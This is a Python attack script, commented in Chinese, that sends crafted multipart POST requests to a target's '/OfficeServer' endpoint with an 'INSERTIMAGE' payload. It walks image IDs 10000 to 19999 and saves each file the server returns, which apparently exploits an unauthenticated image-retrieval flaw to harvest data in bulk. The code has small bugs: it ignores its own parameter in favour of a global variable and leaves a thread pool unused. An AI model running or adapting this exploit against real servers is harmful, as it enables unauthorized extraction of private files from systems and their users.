import requests
from concurrent.futures import ThreadPoolExecutor
executor = ThreadPoolExecutor(max_workers=100)
from argparse import ArgumentParser

parse = ArgumentParser()
parse.add_argument("-t","--target",dest="target",required=False, type=str, help=f"Target ip/domain file")
arg = parse.parse_args()
# 目标URL
url = f'{arg.target}/OfficeServer'

def getimg(imgid):
    boundary = '----WebKitFormBoundarymVk33liI64J7GQaK'
    headers = {
        'Content-Type': 'multipart/form-data; boundary={}'.format(boundary),
    }

    data = (
        '--{boundary}\r\n'
        'Content-Disposition: form-data; name="aaa"\r\n\r\n'
        '{{"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{imgid}"}}\r\n'
        '--{boundary}--\r\n'
    ).format(boundary=boundary,imgid=i)

    response = requests.post(url, headers=headers, data=data)
    # 检查请求是否成功
    if response.ok and len(response.text)>500:
        #其保存图片到本地
        with open(f'img/{i}.jpg', 'wb') as f:
            f.write(response.content)
        print("图片已保存为 response_image.jpg")
    else:
        print("未找到图片：", response.status_code)

for i in range(10000,20000):
    getimg(i)
